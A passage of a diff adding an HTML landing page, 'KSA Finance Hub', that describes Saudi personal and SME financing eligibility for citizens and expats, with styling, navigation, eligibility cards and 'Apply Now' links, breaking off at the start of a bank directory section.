@@ -1,0 +1,2561 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saudi Personal & SME Finance Support 2026 — برنامج التمويل الشخصي ودعم المشاريع</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts: Plus Jakarta Sans & Cairo for Arabic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        saudi: {
+                            green: '#006C35',
+                            greenDark: '#004B24',
+                            gold: '#C89B3C',
+                            goldLight: '#E8CA72',
+                            goldDark: '#9E7724',
+                            navy: '#0D223A',
+                            navyLight: '#18385C',
+                            sand: '#F8F6F1',
+                            sandDark: '#EFEBE1',
+                            borderGold: '#D8B868'
+                        },
+                        ksa: {
+                            green: '#006C35',
+                            greenDark: '#004B24',
+                            greenLight: '#E8F5E9',
+                            gold: '#C89B3C',
+                            goldLight: '#F3E5AB',
+                            goldDark: '#9E7724',
+                            navy: '#0D223A',
+                            sand: '#F4F7F4',
+                            sandDark: '#E5EBE5',
+                            borderGreen: '#81C784'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', 'Cairo', 'sans-serif'],
+                        arabic: ['Cairo', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', 'Cairo', sans-serif;
+            background-color: #F8F6F1;
+            color: #1A202C;
+            overflow-x: hidden;
+        }
+        .arabic-text {
+            font-family: 'Cairo', sans-serif;
+            direction: rtl;
+        }
+        .saudi-gold-border-top {
+            border-top: 4px solid #C89B3C;
+        }
+        .pattern-overlay {
+            background-image: radial-gradient(#C89B3C 0.75px, transparent 0.75px), radial-gradient(#C89B3C 0.75px, #F8F6F1 0.75px);
+            background-size: 32px 32px;
+            background-position: 0 0, 16px 16px;
+            opacity: 0.12;
+        }
+        .responsive-media-frame {
+            background-color: #0D223A;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .responsive-media-img {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            max-height: 440px;
+            object-fit: contain;
+            display: block;
+        }
+        .slot-media-img {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            max-height: 240px;
+            object-fit: contain;
+            display: block;
+        }
+
+        /* Application Form Stepper Styles */
+        #ksa-loan-application-portal .step-line-active {
+            background-color: #006C35;
+        }
+        #ksa-loan-application-portal .step-circle-active {
+            background-color: #006C35;
+            color: #FFFFFF;
+            box-shadow: 0 0 0 4px rgba(0, 108, 53, 0.25);
+        }
+        #ksa-loan-application-portal .step-circle-completed {
+            background-color: #006C35;
+            color: #FFFFFF;
+        }
+        @keyframes ksaSpinFast {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #ksa-loan-application-portal .spinner-ring {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #C89B3C;
+            border-radius: 50%;
+            animation: ksaSpinFast 0.8s linear infinite;
+        }
+        @keyframes ksaShake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        #ksa-loan-application-portal .input-error {
+            border-color: #DC2626 !important;
+            background-color: #FEF2F2 !important;
+            animation: ksaShake 0.3s ease-in-out;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #F8F6F1;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #C89B3C;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #006C35;
+        }
+    </style>
+</head>
+<body id="top-home" class="bg-saudi-sand text-gray-800 antialiased selection:bg-saudi-gold selection:text-white pb-16 lg:pb-0">
+
+    <!-- TOP REGULATORY ANNOUNCEMENT BAR -->
+    <div class="bg-saudi-navy text-white text-xs py-2.5 px-4 border-b border-saudi-gold/30">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-2">
+            <div class="flex items-center gap-2 text-center md:text-left">
+                <span class="inline-block w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse shrink-0"></span>
+                <span><strong>Saudi Central Bank (SAMA) Guidelines:</strong> Eligibility for Citizens & Residents / Expats (3–12+ Months Service & GOSI Required)</span>
+            </div>
+            <div class="flex items-center gap-3 text-[11px] text-gray-300">
+                <span class="hidden sm:inline">Official Portals:</span>
+                <a href="https://www.my.gov.sa" target="_blank" rel="noopener" class="underline hover:text-saudi-gold transition">my.gov.sa</a>
+                <span>•</span>
+                <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="underline hover:text-saudi-gold transition">sama.gov.sa</a>
+                <span class="bg-saudi-green px-2.5 py-0.5 rounded font-black text-white ml-2">5K - 500K SAR</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN HEADER NAVIGATION -->
+    <header class="sticky top-0 z-40 bg-white/95 backdrop-blur-md border-b-2 border-saudi-gold/40 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16 sm:h-20">
+
+                <!-- Logo & Brand Badge -->
+                <a href="#top-home" class="flex items-center gap-3 group">
+                    <div class="w-10 h-10 sm:w-11 sm:h-11 rounded-2xl bg-gradient-to-br from-saudi-navy to-saudi-green text-saudi-goldLight flex items-center justify-center font-black text-lg shadow-md border border-saudi-gold/50 group-hover:scale-105 transition">
+                        <i class="fa-solid fa-landmark"></i>
+                    </div>
+                    <div>
+                        <div class="font-black text-saudi-navy text-sm sm:text-base tracking-tight group-hover:text-saudi-green transition flex items-center gap-1.5">
+                            <span>KSA Finance Hub</span>
+                            <span class="bg-saudi-gold/20 text-saudi-goldDark text-[10px] font-black px-2 py-0.5 rounded-full border border-saudi-gold/40">2026</span>
+                        </div>
+                        <div class="text-[10px] text-gray-500 font-bold tracking-wider uppercase">برنامج التمويل الشخصي ودعم المشاريع</div>
+                    </div>
+                </a>
+
+                <!-- Desktop Pill Navigation Buttons -->
+                <nav class="hidden lg:flex items-center gap-2">
+                    <a href="#slider-showcase" class="px-3.5 py-2 rounded-full border border-gray-200 bg-gray-50/80 hover:bg-saudi-navy hover:text-white hover:border-saudi-navy text-xs font-bold text-gray-700 transition flex items-center gap-1.5">
+                        <i class="fa-solid fa-images text-saudi-goldDark"></i>
+                        <span>Gallery</span>
+                    </a>
+                    <a href="#eligibility-guide" class="px-3.5 py-2 rounded-full border border-gray-200 bg-gray-50/80 hover:bg-saudi-navy hover:text-white hover:border-saudi-navy text-xs font-bold text-gray-700 transition flex items-center gap-1.5">
+                        <i class="fa-solid fa-passport text-saudi-goldDark"></i>
+                        <span>Expat & Citizen Rules</span>
+                    </a>
+                    <a href="#directory" class="px-3.5 py-2 rounded-full border border-gray-200 bg-gray-50/80 hover:bg-saudi-navy hover:text-white hover:border-saudi-navy text-xs font-bold text-gray-700 transition flex items-center gap-1.5">
+                        <i class="fa-solid fa-building-columns text-saudi-goldDark"></i>
+                        <span>20 Saudi Banks</span>
+                    </a>
+                    <a href="#calculator" class="px-3.5 py-2 rounded-full border border-gray-200 bg-gray-50/80 hover:bg-saudi-navy hover:text-white hover:border-saudi-navy text-xs font-bold text-gray-700 transition flex items-center gap-1.5">
+                        <i class="fa-solid fa-calculator text-saudi-goldDark"></i>
+                        <span>EMI Calculator</span>
+                    </a>
+                    <a href="#assessment" class="px-3.5 py-2 rounded-full border border-gray-200 bg-gray-50/80 hover:bg-saudi-navy hover:text-white hover:border-saudi-navy text-xs font-bold text-gray-700 transition flex items-center gap-1.5">
+                        <i class="fa-solid fa-user-check text-saudi-goldDark"></i>
+                        <span>DBR Check</span>
+                    </a>
+                </nav>
+
+                <!-- Right Apply Now Button & Mobile Toggle -->
+                <div class="flex items-center gap-3">
+                    <a href="#apply-form" class="inline-flex items-center gap-2 px-4 sm:px-5 py-2.5 rounded-full bg-gradient-to-r from-saudi-green via-emerald-700 to-saudi-greenDark hover:from-emerald-700 hover:to-emerald-900 text-white font-black text-xs shadow-md hover:shadow-lg transition transform hover:-translate-y-0.5 border border-emerald-400/40">
+                        <i class="fa-solid fa-circle-check text-sm"></i>
+                        <span>Apply Now</span>
+                    </a>
+
+                    <button type="button" onclick="toggleMobileMenu()" class="lg:hidden p-2.5 rounded-xl bg-saudi-sand border border-saudi-borderGold/50 text-saudi-navy hover:text-saudi-green transition focus:outline-none">
+                        <i id="mobileMenuIcon" class="fa-solid fa-bars text-lg"></i>
+                    </button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Mobile Drawer Navigation -->
+        <div id="mobileMenu" class="hidden lg:hidden bg-white border-b-2 border-saudi-gold p-4 space-y-2.5 shadow-xl">
+            <a href="#slider-showcase" onclick="toggleMobileMenu()" class="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-saudi-sand text-xs font-bold text-saudi-navy border border-gray-200">
+                <i class="fa-solid fa-images text-saudi-gold"></i> 6-Slide Auto Showcase
+            </a>
+            <a href="#eligibility-guide" onclick="toggleMobileMenu()" class="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-saudi-sand text-xs font-bold text-saudi-navy border border-gray-200">
+                <i class="fa-solid fa-passport text-saudi-green"></i> Expat & Citizen Rules
+            </a>
+            <a href="#directory" onclick="toggleMobileMenu()" class="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-saudi-sand text-xs font-bold text-saudi-navy border border-gray-200">
+                <i class="fa-solid fa-building-columns text-saudi-gold"></i> 20 Saudi Banks Directory
+            </a>
+            <a href="#calculator" onclick="toggleMobileMenu()" class="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-saudi-sand text-xs font-bold text-saudi-navy border border-gray-200">
+                <i class="fa-solid fa-calculator text-saudi-green"></i> Monthly EMI Calculator
+            </a>
+            <a href="#assessment" onclick="toggleMobileMenu()" class="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-saudi-sand text-xs font-bold text-saudi-navy border border-gray-200">
+                <i class="fa-solid fa-user-check text-saudi-gold"></i> DBR Eligibility Check
+            </a>
+            <a href="#apply-form" onclick="toggleMobileMenu()" class="flex items-center justify-center gap-2 px-4 py-3 rounded-xl bg-gradient-to-r from-saudi-green to-saudi-greenDark text-white font-extrabold text-xs shadow-md w-full mt-2">
+                <i class="fa-solid fa-circle-check"></i> Apply Now (5-Step Form)
+            </a>
+        </div>
+    </header>
+
+    <!-- HERO SECTION -->
+    <section class="relative bg-gradient-to-br from-saudi-navy via-[#122740] to-saudi-greenDark text-white pt-12 pb-20 px-4 sm:px-6 lg:px-8 overflow-hidden">
+        <div class="absolute inset-0 pattern-overlay pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto relative z-10">
+            <div class="grid lg:grid-cols-12 gap-10 items-center">
+
+                <!-- Left Content -->
+                <div class="lg:col-span-7 space-y-6 text-center lg:text-left">
+                    <div class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-white/10 backdrop-blur-md border border-saudi-gold/40 text-saudi-goldLight text-xs font-bold">
+                        <i class="fa-solid fa-award"></i>
+                        <span>Saudi Personal & SME Finance Support 2026 — برنامج التمويل الشخصي ودعم المشاريع</span>
+                    </div>
+
+                    <h1 class="text-3xl sm:text-4xl lg:text-5xl font-black tracking-tight text-white leading-tight">
+                        Empowering Citizens & Residents with <span class="text-transparent bg-clip-text bg-gradient-to-r from-saudi-goldLight via-yellow-200 to-saudi-gold">Personal & Business</span> Financing Guidance
+                    </h1>
+
+                    <p class="text-gray-200 text-sm sm:text-base lg:text-lg max-w-2xl font-normal leading-relaxed mx-auto lg:mx-0">
+                        Whether you are a Saudi citizen or a resident expat / foreign worker in Saudi Arabia with active GOSI & Iqama, explore personal facilities, SME growth capital, and SAMA regulated options from <strong class="text-saudi-goldLight">5,000 SAR to 500,000 SAR</strong> (5 Thousand to 5 Lakh Riyals).
+                    </p>
+
+                    <!-- Hero Quick Action Buttons -->
+                    <div class="flex flex-wrap gap-3.5 justify-center lg:justify-start pt-2">
+                        <a href="#apply-form" class="px-6 py-3.5 bg-saudi-green hover:bg-emerald-700 text-white font-extrabold text-xs sm:text-sm rounded-xl shadow-lg transition flex items-center gap-2 border border-emerald-400/40">
+                            <i class="fa-solid fa-circle-check"></i>
+                            <span>Apply Now</span>
+                        </a>
+                        <a href="#slider-showcase" class="px-6 py-3.5 bg-saudi-gold hover:bg-saudi-goldDark text-saudi-navy font-extrabold text-xs sm:text-sm rounded-xl shadow-lg transition flex items-center gap-2">
+                            <i class="fa-solid fa-images"></i>
+                            <span>View 6-Slide Showcase</span>
+                        </a>
+                        <a href="#calculator" class="px-6 py-3.5 bg-white/15 hover:bg-white/25 border border-white/30 text-white font-extrabold text-xs sm:text-sm rounded-xl backdrop-blur-sm transition flex items-center gap-2">
+                            <i class="fa-solid fa-calculator"></i>
+                            <span>Calculate Monthly EMI</span>
+                        </a>
+                    </div>
+
+                    <!-- Key Badges -->
+                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-4 text-xs font-semibold">
+                        <div class="bg-white/10 backdrop-blur-sm p-3 rounded-xl border border-white/10 flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-percent text-saudi-gold text-base"></i>
+                            <span>Shariah Murabaha</span>
+                        </div>
+                        <div class="bg-white/10 backdrop-blur-sm p-3 rounded-xl border border-white/10 flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-fingerprint text-saudi-gold text-base"></i>
+                            <span>Nafath & Absher</span>
+                        </div>
+                        <div class="bg-white/10 backdrop-blur-sm p-3 rounded-xl border border-white/10 flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-shield-check text-saudi-gold text-base"></i>
+                            <span>SAMA DBR Rules</span>
+                        </div>
+                        <div class="bg-white/10 backdrop-blur-sm p-3 rounded-xl border border-white/10 flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-building-columns text-saudi-gold text-base"></i>
+                            <span>20 Saudi Banks</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Hero Visual Graphic with Slot 1 -->
+                <div class="lg:col-span-5">
+                    <div class="bg-gradient-to-b from-white/95 to-white/90 rounded-3xl p-5 sm:p-6 text-gray-900 shadow-2xl border-2 border-saudi-gold relative">
+                        <div class="absolute -top-3.5 left-1/2 -translate-x-1/2 bg-saudi-gold text-saudi-navy px-4 py-1 rounded-full text-[11px] font-black tracking-widest uppercase shadow whitespace-nowrap">
+                            Institutional Overview 2026
+                        </div>
+
+                        <!-- SLOT 1 IMAGE -->
+                        <div class="pt-3 pb-3 border-b border-gray-200">
+                            <div class="responsive-media-frame rounded-2xl border border-saudi-gold/40 shadow-sm">
+                                <img id="img-slot-1" data-slot-id="slot-1" src="" alt="Hero Finance Spotlight" class="slot-media-img">
+                            </div>
+                            <h3 class="text-xl sm:text-2xl font-black text-saudi-navy text-center mt-3">5,000 – 500,000 SAR</h3>
+                            <p class="text-[11px] font-bold text-saudi-green uppercase tracking-wider mt-0.5 text-center">5 Thousand to 5 Lakh Riyals • Saudi Finance Frameworks</p>
+                        </div>
+
+                        <div class="space-y-2.5 py-4 text-xs sm:text-sm">
+                            <div class="flex justify-between items-center py-1.5 border-b border-gray-100">
+                                <span class="text-gray-600 font-medium">Financing Range</span>
+                                <span class="font-extrabold text-saudi-navy">5,000 SAR - 500,000 SAR</span>
+                            </div>
+                            <div class="flex justify-between items-center py-1.5 border-b border-gray-100">
+                                <span class="text-gray-600 font-medium">Profit Structure</span>
+                                <span class="font-extrabold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">Shariah Murabaha / APR</span>
+                            </div>
+                            <div class="flex justify-between items-center py-1.5 border-b border-gray-100">
+                                <span class="text-gray-600 font-medium">Max Repayment Tenure</span>
+                                <span class="font-extrabold text-saudi-navy">Up to 60 Months (5 Years)</span>
+                            </div>
+                            <div class="flex justify-between items-center py-1.5">
+                                <span class="text-gray-600 font-medium">Verification Method</span>
+                                <span class="font-extrabold text-saudi-navy">Nafath & SIMAH Check</span>
+                            </div>
+                        </div>
+
+                        <a href="#apply-form" class="w-full block text-center py-3 bg-saudi-navy hover:bg-saudi-green text-white font-bold rounded-xl transition shadow">
+                            Apply Now
+                        </a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- METRICS HIGHLIGHT STRIP -->
+    <section class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 -mt-8 relative z-20">
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+            <div class="bg-white rounded-2xl p-4 sm:p-5 shadow-md border-t-4 border-saudi-gold text-center hover:shadow-lg transition">
+                <i class="fa-solid fa-coins text-saudi-green text-2xl mb-1.5"></i>
+                <div class="text-base sm:text-lg font-black text-saudi-navy">5K to 500K SAR</div>
+                <div class="text-[11px] text-gray-500 font-medium">5 Thousand to 5 Lakh Riyals</div>
+            </div>
+            <div class="bg-white rounded-2xl p-4 sm:p-5 shadow-md border-t-4 border-saudi-green text-center hover:shadow-lg transition">
+                <i class="fa-solid fa-briefcase text-saudi-gold text-2xl mb-1.5"></i>
+                <div class="text-base sm:text-lg font-black text-saudi-navy">3 to 12+ Months</div>
+                <div class="text-[11px] text-gray-500 font-medium">Service Tenure & GOSI</div>
+            </div>
+            <div class="bg-white rounded-2xl p-4 sm:p-5 shadow-md border-t-4 border-saudi-navy text-center hover:shadow-lg transition">
+                <i class="fa-solid fa-scale-balanced text-saudi-navy text-2xl mb-1.5"></i>
+                <div class="text-base sm:text-lg font-black text-saudi-navy">33.33% / 30% DBR</div>
+                <div class="text-[11px] text-gray-500 font-medium">SAMA Consumer Protection</div>
+            </div>
+            <div class="bg-white rounded-2xl p-4 sm:p-5 shadow-md border-t-4 border-saudi-gold text-center hover:shadow-lg transition">
+                <i class="fa-solid fa-passport text-emerald-600 text-2xl mb-1.5"></i>
+                <div class="text-base sm:text-lg font-black text-saudi-navy">Citizens & Expats</div>
+                <div class="text-[11px] text-gray-500 font-medium">National ID & Iqama Holders</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- AUTO-PLAY REPEATING 6-SLIDE IMAGE CAROUSEL -->
+    <section id="slider-showcase" class="py-14 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-center max-w-3xl mx-auto mb-8">
+            <span class="text-saudi-green font-extrabold text-xs uppercase tracking-widest bg-saudi-green/10 px-3 py-1 rounded-full">Auto-Play Repeating Gallery</span>
+            <h2 class="text-2xl sm:text-3xl font-black text-saudi-navy mt-3">Saudi Finance Visual Showcase — معرض التمويل السعودي</h2>
+            <p class="text-gray-600 text-xs sm:text-sm mt-1">Continuous auto-playing slider displaying full uncropped visuals across mobile and desktop screens.</p>
+        </div>
+
+        <div id="ksa-auto-slider" class="bg-white rounded-3xl p-3 sm:p-6 shadow-xl border-2 border-saudi-gold/60">
+            <div class="relative rounded-2xl overflow-hidden bg-saudi-navy border border-saudi-gold/40">
+                <div class="responsive-media-frame w-full">
+                    <img id="sliderActiveImage" src="" alt="Saudi Finance Slide" class="responsive-media-img">
+                </div>
+
+                <!-- Previous / Next Controls -->
+                <button type="button" onclick="prevSlide()" aria-label="Previous Slide" class="absolute left-2 sm:left-4 top-1/2 -translate-y-1/2 w-9 h-9 sm:w-11 sm:h-11 rounded-full bg-white/90 hover:bg-saudi-gold text-saudi-navy font-black shadow-lg flex items-center justify-center transition cursor-pointer">
+                    <i class="fa-solid fa-chevron-left text-xs sm:text-sm"></i>
+                </button>
+                <button type="button" onclick="nextSlide()" aria-label="Next Slide" class="absolute right-2 sm:right-4 top-1/2 -translate-y-1/2 w-9 h-9 sm:w-11 sm:h-11 rounded-full bg-white/90 hover:bg-saudi-gold text-saudi-navy font-black shadow-lg flex items-center justify-center transition cursor-pointer">
+                    <i class="fa-solid fa-chevron-right text-xs sm:text-sm"></i>
+                </button>
+            </div>
+
+            <!-- Caption & CTA Below Image -->
+            <div class="mt-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4 px-1">
+                <div>
+                    <div class="flex flex-wrap items-center gap-2">
+                        <span id="sliderBadge" class="bg-saudi-green text-white text-[10px] font-black px-2.5 py-0.5 rounded-full uppercase">Slide 1 of 6</span>
+                        <h3 id="sliderTitle" class="text-base sm:text-lg font-black text-saudi-navy"></h3>
+                    </div>
+                    <p id="sliderSubtitle" class="text-xs sm:text-sm text-gray-600 mt-1"></p>
+                </div>
+                <a href="#apply-form" class="px-5 py-2.5 bg-saudi-navy hover:bg-saudi-green text-white font-extrabold text-xs rounded-xl shadow transition text-center shrink-0">
+                    Apply Now →
+                </a>
+            </div>
+
+            <!-- Dot Indicators -->
+            <div id="sliderDots" class="flex items-center justify-center gap-2 mt-4 pt-3 border-t border-gray-100"></div>
+        </div>
+    </section>
+
+    <!-- EXPAT & CITIZEN LOAN ELIGIBILITY GUIDANCE + SLOTS 2 & 3 -->
+    <section id="eligibility-guide" class="py-14 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-center max-w-3xl mx-auto mb-10">
+            <span class="text-saudi-green font-extrabold text-xs uppercase tracking-widest bg-saudi-green/10 px-3 py-1 rounded-full">Residency & Employment Requirements</span>
+            <h2 class="text-3xl font-black text-saudi-navy mt-3">Loan Eligibility for Expats & Citizens — شروط التأهل للمواطنين والمقيمين</h2>
+            <p class="text-gray-600 text-sm mt-1">Clear overview of criteria for resident expatriates / foreign workers in Saudi Arabia and Saudi citizens.</p>
+        </div>
+
+        <div class="grid md:grid-cols-2 gap-8">
+
+            <!-- Card 1: Expat / Resident Loan Guidance + SLOT 2 -->
+            <div class="bg-white rounded-3xl p-6 sm:p-8 border-2 border-saudi-gold/60 shadow-lg relative overflow-hidden flex flex-col justify-between">
+                <div class="absolute top-0 right-0 bg-saudi-navy text-saudi-goldLight text-[10px] font-black px-4 py-1.5 rounded-bl-xl uppercase tracking-wider">
+                    RESIDENT EXPATS & FOREIGN WORKERS
+                </div>
+
+                <div>
+                    <div class="flex items-center gap-3 mb-4 mt-2">
+                        <div class="w-12 h-12 bg-saudi-navy/10 rounded-2xl flex items-center justify-center text-saudi-navy text-2xl shrink-0">
+                            <i class="fa-solid fa-passport"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-black text-saudi-navy">KSA Resident Expats / Foreign Workers</h3>
+                            <p class="text-xs text-gray-500">Working in Riyadh, Jeddah, Dammam & Across KSA</p>
+                        </div>
+                    </div>
+
+                    <!-- SLOT 2 IMAGE -->
+                    <div class="responsive-media-frame rounded-2xl border border-saudi-gold/40 mb-4">
+                        <img id="img-slot-2" data-slot-id="slot-2" src="" alt="Expat Resident Finance Visual" class="slot-media-img">
+                    </div>
+
+                    <p class="text-xs sm:text-sm text-gray-600 leading-relaxed mb-4">
+                        Non-Saudi residents living and working in Saudi Arabia with a valid Iqama and active employment can obtain personal and SME financing through SAMA-licensed banks and finance companies, subject to lender tenure and salary rules.
+                    </p>
+
+                    <div class="space-y-3 bg-saudi-sand p-4 rounded-2xl border border-saudi-borderGold/40 text-xs text-gray-700">
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-clock text-saudi-green mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">Length of Service (3 to 12+ Months):</strong>
+                                Many lenders require <strong>3 to 6 months</strong> minimum service for salary-transfer loans and <strong>6 to 12+ months</strong> (plus valid Iqama) for non-transfer or standard resident products.
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-money-check-dollar text-saudi-green mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">Minimum Monthly Salary & GOSI:</strong>
+                                Typically starts from <strong>3,500 SAR to 5,000+ SAR</strong> depending on the bank and product, backed by active GOSI registration for private-sector employees.
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-building-user text-saudi-green mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">Employer Approval & Salary Transfer:</strong>
+                                Working for an approved employer or transferring your salary often improves profit rates, loan limits, and tenor options.
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-shield-halved text-saudi-green mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">Credit Bureau Check (SIMAH):</strong>
+                                Applicants undergo a SIMAH credit check; strong payment history and low existing obligations support approval.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-5 pt-3 border-t border-gray-100 flex items-center justify-between text-xs font-bold text-saudi-navy">
+                    <span><i class="fa-solid fa-circle-info text-saudi-gold"></i> Required: Valid Iqama + Nafath</span>
+                    <a href="#apply-form" class="text-saudi-green hover:underline font-black">Apply Now <i class="fa-solid fa-arrow-right"></i></a>
+                </div>
+            </div>
+
+            <!-- Card 2: Saudi Citizen Guidance + SLOT 3 -->
+            <div class="bg-white rounded-3xl p-6 sm:p-8 border-2 border-saudi-green/50 shadow-lg relative overflow-hidden flex flex-col justify-between">
+                <div class="absolute top-0 right-0 bg-saudi-green text-white text-[10px] font-black px-4 py-1.5 rounded-bl-xl uppercase tracking-wider">
+                    SAUDI CITIZENS
+                </div>
+
+                <div>
+                    <div class="flex items-center gap-3 mb-4 mt-2">
+                        <div class="w-12 h-12 bg-saudi-green/10 rounded-2xl flex items-center justify-center text-saudi-green text-2xl shrink-0">
+                            <i class="fa-solid fa-flag-checkered"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-xl font-black text-saudi-navy">Saudi Citizens (KSA Nationals)</h3>
+                            <p class="text-xs text-gray-500">Banking & SME Guarantee Programs</p>
+                        </div>
+                    </div>
+
+                    <!-- SLOT 3 IMAGE -->
+                    <div class="responsive-media-frame rounded-2xl border border-saudi-green/40 mb-4">
+                        <img id="img-slot-3" data-slot-id="slot-3" src="" alt="Saudi Citizen Finance Visual" class="slot-media-img">
+                    </div>
+
+                    <p class="text-xs sm:text-sm text-gray-600 leading-relaxed mb-4">
+                        Saudi citizens have access to Shariah-compliant personal financing across Saudi banks and digital banks, alongside SME financing and loan guarantee programs such as Kafalah through partner banks.
+                    </p>
+
+                    <div class="space-y-3 bg-saudi-sand p-4 rounded-2xl border border-saudi-borderGold/40 text-xs text-gray-700">
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-star text-saudi-goldDark mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">Shariah-Compliant Financing:</strong>
+                                Personal Tawarruq / Murabaha options available across local and digital Saudi banks with transparent APR disclosures.
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-briefcase text-saudi-goldDark mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">Employment & Salary Structure:</strong>
+                                Government, semi-government, and approved private-sector employees with GOSI/salary records qualify for standard tenors up to 60 months.
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-scale-unbalanced-flip text-saudi-goldDark mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">SAMA DBR Framework:</strong>
+                                Monthly debt commitments are assessed under SAMA responsible lending rules (33.33% standard consumer DBR cap, with higher brackets applying to specific mortgage programs).
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-2.5">
+                            <i class="fa-solid fa-handshake text-saudi-goldDark mt-0.5"></i>
+                            <div>
+                                <strong class="text-saudi-navy block">SME Support & Kafalah:</strong>
+                                Small and medium enterprises can access bank financing supported by the Kafalah loan guarantee program and Monsha'at resources.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-5 pt-3 border-t border-gray-100 flex items-center justify-between text-xs font-bold text-saudi-navy">
+                    <span><i class="fa-solid fa-circle-check text-emerald-600"></i> Fast-track via Nafath</span>
+                    <a href="#apply-form" class="text-saudi-green hover:underline font-black">Apply Now <i class="fa-solid fa-arrow-right"></i></a>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- SEARCHABLE & FILTERABLE DIRECTORY OF 20 SAUDI BANKS -->
+    <section id="directory" class="bg-saudi-sand py-16 border-t border-saudi-sandDark">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-10">
+                <span class="text-saudi-green font-extrabold text-xs uppercase tracking-widest bg-saudi-green/10 px-3 py-1 rounded-full">Comprehensive Directory</span>
+                <h2 class="text-3xl font-black text-saudi-navy mt-3">Saudi Licensed Banks Directory — دليل البنوك السعودية</h2>
+                <p class="text-gray-600 text-sm mt-1">Browse and filter 20 SAMA-licensed financial institutions operating in Saudi Arabia.</p>
+            </div>
+
+            <!-- Search & Category Filter Controls -->
+            <div class="bg-white rounded-2xl p-4 sm:p-6 shadow-md border border-gray-200 mb-8 space-y-4">
+                <div class="grid md:grid-cols-12 gap-4 items-center">
+
+                    <div class="md:col-span-6 relative">
+                        <i class="fa-solid fa-magnifying-glass absolute left-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
